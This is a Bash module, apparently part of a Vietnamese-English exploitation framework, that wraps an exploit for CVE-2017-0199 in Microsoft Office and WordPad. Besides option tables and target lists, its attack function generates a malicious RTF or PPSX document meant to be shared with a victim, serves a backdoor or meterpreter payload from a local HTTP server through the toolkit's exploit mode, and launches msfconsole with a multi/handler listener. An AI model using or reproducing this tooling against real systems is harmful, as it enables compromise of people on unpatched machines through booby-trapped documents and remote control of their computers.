function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2017-0199 | Lỗ hổng thực thi mã từ xa Microsoft Office/WordPad
     Mô-đun: exploit/windows/fileformat/CVE-2017-0199_office_rc
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Không
    Công bố: 04/11/2017

Cung cấp bởi:
  @nixawk for RTF sample, @Li Haifei, @bhdresh

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Tất cả những chương trình Microsoft Office và WordPad được liệt kê ở dưới :
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
	   Windows 7 for 32-bit Systems Service Pack 1
	   Windows 7 for x64-based Systems Service Pack 1
	   Windows Server 2008 for 32-bit Systems Service Pack 2
	   Windows Server 2008 for Itanium-Based Systems Service Pack 2
	   Windows Server 2008 for x64-based Systems Service Pack 2
	   Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
	   Windows Server 2008 R2 for x64-based Systems Service Pack 1
	   Windows Server 2012
	   Windows Vista Service Pack 2
	   Windows Vista x64 Edition Service Pack 2
!
module_compare
cat << !
Miêu tả:
   Lỗ hổng này cho phép một tác nhân độc hại tải xuống và thực thi tập lệnh Visual Basic
   chứa các lệnh PowerShell khi người dùng mở tài liệu có chứa mã khai thác.
   Một tác nhân đe dọa gửi email Word cho người dùng nhắm đến đối tượng liên kết được nhúng OLE2
   Khi người dùng mở tài liệu, winword.exe sẽ gửi yêu cầu HTTP đến máy chủ từ xa
   để truy xuất tệp HTA độc hại.
   Tệp được máy chủ trả về là tệp RTF giả mạo với tập lệnh độc hại được nhúng Winword.exe
   tra cứu trình xử lý tệp cho ứng dụng / hta thông qua một đối tượng COM,
   khiến ứng dụng Microsoft HTA (mshta.exe) tải và thực thi tập lệnh độc hại.

Tham khảo:
   https://www.cvedetails.com/cve/CVE-2017-0199/
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199
   https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/
   https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
   https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2017-0199 | Microsoft Office/WordPad Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2017-0199_office_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
  Disclosed: 04/11/2017

Provided by:
  @nixawk for RTF sample, @Li Haifei, @bhdresh

Available targets:
   Id  Name
   --  ----
   0   All Microsoft Office and WordPad programs are listed below:
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
	   Windows 7 for 32-bit Systems Service Pack 1
	   Windows 7 for x64-based Systems Service Pack 1
	   Windows Server 2008 for 32-bit Systems Service Pack 2
	   Windows Server 2008 for Itanium-Based Systems Service Pack 2
	   Windows Server 2008 for x64-based Systems Service Pack 2
	   Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
	   Windows Server 2008 R2 for x64-based Systems Service Pack 1
	   Windows Server 2012
	   Windows Vista Service Pack 2
	   Windows Vista x64 Edition Service Pack 2
!
module_compare
cat << !
Description:
   This vulnerability allows a malicious actor to download and execute a Visual Basic script
   containing PowerShell commands when a user opens a document containing an embedded exploit.
   A threat actor emails a Microsoft Word document to a targeted user with
   an embedded OLE2 embedded link object.
   When the user opens the document, winword.exe issues a HTTP request
   to a remote server to retrieve a malicious HTA file.
   The file returned by the server is a fake RTF file with an embedded malicious script.
   Winword.exe looks up the file handler for application/hta through a COM object,
   which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script.

References:
   https://www.cvedetails.com/cve/CVE-2017-0199/
   https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199
   https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/
   https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
   https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	file_name="CVE-2017-0199.rtf"
	type_file="RTF"
	url="http://$lhost/test.doc"
	backdoor_file=""
	srvhost="0.0.0.0"
	srvport="80"
	mix="false"
	x="0"

}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
module1

}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "file_name" ]] || [[ "$new_processing_variables" = "FILE_NAME" ]] || [[ "$new_processing_variables" = "File_name" ]]; then
			############# xóa biến và gán lại biến ################
			unset file_name
			file_name=$module_set
			################# nhận dạng đuôi file ra ###################
			type=`echo $file_name | cut -d'.' -f2` > /dev/null 2>&1
			if  [ "$type" = "rtf" ]; then
				type_file="RTF"
			elif [ "$type" = "ppsx" ]; then
				type_file="PPSX"
			elif [ "$type" = "doc" ]; then
				type_file="DOC"
			fi
		elif [[ "$new_processing_variables" = "url" ]] || [[ "$new_processing_variables" = "URL" ]] || [[ "$new_processing_variables" = "Url" ]]; then
			unset url
			url="$module_set"
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
		elif [[ "$new_processing_variables" = "srvhost" ]] || [[ "$new_processing_variables" = "SRVHOST" ]] || [[ "$new_processing_variables" = "Srvhost" ]]; then
			unset srvhost
			srvhost="$module_set"
		elif [[ "$new_processing_variables" = "srvport" ]] || [[ "$new_processing_variables" = "SRVPORT" ]] || [[ "$new_processing_variables" = "Srvport" ]]; then
			unset srvport
			srvport="$module_set"
		elif [[ "$new_processing_variables" = "mix" ]] || [[ "$new_processing_variables" = "MIX" ]] || [[ "$new_processing_variables" = "Mix" ]]; then
			if [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]]; then
				unset mix
				mix="$module_set"
				unset x
				x="1"
			elif [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset mix
				mix="$module_set"
				unset x
				x="0"

			else 	failed_to_validate=" The following options failed to validate: Value '$module_set' is not valid for option '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		else echo ""

		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
url=`echo $url`
url_lenght=`echo $url | awk '{print length}'`
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare1=`expr $url_lenght - $backdoor_file_lenght`
subtract_compare2=`expr $file_name_lenght - $backdoor_file_lenght`
subtract_compare3=`expr $file_name_lenght - $url_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
		subtract_compare_value=`expr $url_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $url_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
	
		greater_value=$url_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $url_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $url_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
	
		greater_value=$file_name_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
		subtract_compare_value=`expr $url_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $url_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$url_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $file_name_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $url_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
	
		greater_value=$backdoor_file_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_name=$file_name$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $url_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		url=$url$myvar
	unset_value
		subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_name_lenght
	fi
fi

srvhost=`echo $srvhost`
srvhost_lenght=`echo $srvhost | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvhost_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvhost=$srvhost$myvar
unset_value
srvport=`echo $srvport`
srvport_lenght=`echo $srvport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $srvport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	srvport=$srvport$myvar
unset_value
mix=`echo $mix`
mix_lenght=`echo $mix | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $mix_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	mix=$mix$myvar
unset_value


subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_1
}

function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không "
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2017-0199_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name$yes       Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   Mix		  $mix$no    Tạo tập tin RTF bị xáo trộn.
   Url            $url$no    Đường dẫn đến tệp HTA / SCT. Đây phải là một miền hoặc IP nơi công cụ này đang chạy.
   SRVHOST        $srvhost$yes       Máy chủ lắng nghe. Đây phải là một địa chỉ trên máy cục bộ hoặc 0.0.0.0
   SRVPORT        $srvport$yes       Cổng lắng nge.
   Backdoor_file  $backdoor_file$yes       Đường dẫn đến tệp thực thi / shell meterpreter / payload

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2017-0199_office_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   File_name      $file_name$yes      Name of malicious RTF/PPSX file (Share this file with victim).
   Mix		  $mix$no      Generate obfuscated RTF file. 
   Url            $url$no      The path to an HTA/SCT file.Normally, this should be a domain or IP where this tool is running.
   SRVHOST        $srvhost$yes      The local host to listen on.This must be an address on the local machine or 0.0.0.0
   SRVPORT        $srvport$yes      The local port to listen on.
   Backdoor_file  $backdoor_file$yes      Path of an executable file / meterpreter shell / payload.

!
fi
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016 và WordPad

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016 and WordPad

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016 và WordPad

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016 and WordPad

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function output_massage {
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ------------------++-----------------------------------------------------------
    Tên file        ||  $file_name        			                 
    Loại tệp        ||  $type_file       	                                         
    Vị trí lưu file ||  $output_file/$file_name    	  	 
  ------------------++-----------------------------------------------------------


!
elif [ "$language" = "EN" ]; then
cat << !

  ------------------++-----------------------------------------------------------
    File name       ||  $file_name        			                 
    File type       ||  $type_file       	                                 
    File location   ||  $output_file/$file_name    	  	 		 
  ------------------++-----------------------------------------------------------


!
fi
echo -e "$RESET"
}
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
mix=`echo $mix`
url=`echo $url`
srvhost=`echo $srvhost`
srvport=`echo $srvport`
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file
touch $rc_file
	echo "use multi/handler" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2017-0199/"
echo "exploit -j -z" >> $rc_file
cd $path_tool
service postgresql start
xterm -e python cve-2017-0199_toolkit.py -M gen -t $type_file -w $file_name -u $url
check_file=`find -name $file_name`
if [[ "$check_file" != "" ]]; then
mv $path_tool/$file_name $output_file
output_massage
	xterm -e python cve-2017-0199_toolkit.py -M exp -t $type_file -e http://$srvhost/$backdoor_name -p $srvport -l $backdoor_file &
	cd ../../../Victim
	msfconsole -q -r $rc_file
	cd $path_present
else
	cd $path_present
	echo "$error_gen_file"
fi
cd $path_present
}
